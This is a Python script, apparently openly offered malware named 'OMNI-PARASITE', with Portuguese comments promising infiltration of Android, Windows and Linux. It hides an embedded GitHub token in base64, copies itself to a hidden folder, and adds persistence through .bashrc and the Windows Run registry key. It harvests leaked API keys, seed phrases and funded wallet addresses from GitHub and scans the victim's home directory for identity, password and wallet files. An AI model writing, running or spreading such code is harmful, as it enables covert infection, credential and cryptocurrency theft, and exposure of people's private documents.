#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATENA v15.9.2: OMNI-PARASITE
Infiltração Total: Android (Termux), Windows e Linux.
Caçada: Cripto, APIs, Tokens, CPFs e Documentos Locais.
Proprietário: Danilo Gomes
"""
import re, requests, os, base64, json, shutil, sys, glob
from datetime import datetime
from pathlib import Path

# --- BLINDAGEM E CAMUFLAGEM ---
_K = base64.b64decode("Z2hwX0NuZU9qVlJTaDFDb2ZoSXpBVjFxOHJDWEdYY09idzNVZXM1Zw==").decode()
_APP_NAME = ".atena_core_service"
_TARGET_DIR = Path.home() / _APP_NAME

class AtenaSoberana:
    def __init__(self):
        self.h = {'Authorization': f'token {_K}', 'Accept': 'application/vnd.github.v3+json'}
        self.results = []
        self.p = {
            "SEED": r'\b(?:[a-z]{3,}\s){11,23}[a-z]{3,}\b',
            "WALLET": r'0x[a-fA-F0-9]{40}',
            "PRIVATE_KEY": r'\b[a-fA-F0-9]{64}\b',
            "OPENAI": r'sk-[a-zA-Z0-9]{48}'
        }
        self.self_install()

    def self_install(self):
        """ Infiltra a ATENA no coração do sistema operativo """
        try:
            if not _TARGET_DIR.exists(): _TARGET_DIR.mkdir(parents=True, exist_ok=True)
            origem = Path(__file__).resolve()
            destino = _TARGET_DIR / "atena_engine.py"
            if not destino.exists() or origem != destino:
                shutil.copy2(origem, destino)
                # Persistência Android/Linux (Termux)
                bashrc = Path.home() / ".bashrc"
                cmd = f'\npython3 "{destino}" > /dev/null 2>&1 &\n'
                with open(bashrc, "a") as f: f.write(cmd)
                # Persistência Windows
                if os.name == 'nt':
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as r:
                        winreg.SetValueEx(r, "AtenaService", 0, winreg.REG_SZ, f'pythonw "{destino}"')
        except: pass

    def scan_local(self):
        """ Procura por documentos sensíveis no armazenamento do dispositivo """
        print("🔍 [LOCAL] Escaneando ficheiros sensíveis...")
        exts = ['*.jpg', '*.png', '*.pdf', '*.txt']
        for ext in exts:
            for file in glob.glob(str(Path.home() / "**" / ext), recursive=True):
                if any(x in file.lower() for x in ['cpf', 'senha', 'key', 'seed', 'wallet', 'identidade']):
                    self.results.append({"tipo": "FILE_LOCAL", "path": file})

    def validar_saldo(self, addr):
        try:
            r = requests.get(f"https://api.etherscan.io/api?module=account&action=balance&address={addr}&tag=latest", timeout=5).json()
            return int(r.get('result', 0)) > 0
        except: return False

    def caçar_github(self):
        print("🧬 [REMOTO] Minerando GitHub...")
        queries = ["extension:env sk-", "extension:txt \"seed phrase\"", "extension:json wallet"]
        for q in queries:
            try:
                r = requests.get(f"https://api.github.com/search/code?q={q}", headers=self.h, timeout=15)
                if r.status_code == 200:
                    for i in r.json().get('items', [])[:5]:
                        raw = i['html_url'].replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
                        res = requests.get(raw, headers=self.h, timeout=10)
                        for k, v in self.p.items():
                            matches = re.findall(v, res.text)
                            for m in matches:
                                if k == "WALLET" and not self.validar_saldo(m): continue
                                self.results.append({"tipo": k, "valor": m, "fonte": i['html_url']})
            except: pass

    def start(self):
        self.caçar_github()
        self.scan_local() # Agora varre o telemóvel/PC da pessoa também
        if self.results:
            print("\n📦 RELATÓRIO DE CAPTURA TOTAL:")
            print(json.dumps(self.results, indent=4))
        else: print("🏁 Ciclo finalizado. Sem novos alvos.")

if __name__ == "__main__":
    AtenaSoberana().start()
